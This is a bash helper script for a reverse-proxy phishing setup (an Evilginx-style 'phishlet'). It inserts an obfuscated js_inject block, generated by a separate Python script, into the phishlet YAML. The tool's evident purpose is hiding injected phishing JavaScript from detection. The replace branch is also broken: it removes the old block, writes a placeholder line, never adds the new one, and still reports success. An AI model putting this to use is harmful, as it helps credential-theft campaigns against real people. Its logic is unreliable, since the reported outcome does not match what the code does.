#!/bin/bash

PHISHLET="$1"
BACKUP="${PHISHLET}.bak"
OBFUSCATOR="js_obfuscator_yaml.py"

if [[ -z "$PHISHLET" || ! -f "$PHISHLET" ]]; then
  echo "Usage: $0 <path-to-phishlet.yaml>"
  exit 1
fi

if [[ ! -f "$OBFUSCATOR" ]]; then
  echo "[!] Obfuscator script '$OBFUSCATOR' not found."
  exit 2
fi

echo "[*] Backing up original phishlet to $BACKUP"
cp "$PHISHLET" "$BACKUP"

echo "[*] Generating obfuscated js_inject block..."
JS_BLOCK=$(python3 "$OBFUSCATOR")

# Check if js_inject already exists
if grep -q "^js_inject:" "$PHISHLET"; then
  echo "[*] Replacing existing js_inject block..."
  awk '
    BEGIN { skip=0 }
    /^js_inject:/ { print "[removed old js_inject]"; skip=1; next }
    /^[^ ]/ && skip==1 { skip=0 }
    skip==0 { print }
  ' "$BACKUP" > "$PHISHLET.tmp"
  mv "$PHISHLET.tmp" "$PHISHLET"
else
  echo "[*] No js_inject block found. Inserting before force_post..."
  awk -v jsblock="$JS_BLOCK" '
    /force_post:/ && !injected {
      print jsblock
      injected=1
    }
    { print }
  ' "$PHISHLET" > "$PHISHLET.tmp"
  mv "$PHISHLET.tmp" "$PHISHLET"
fi

echo "[✓] Obfuscated js_inject inserted correctly into $PHISHLET"
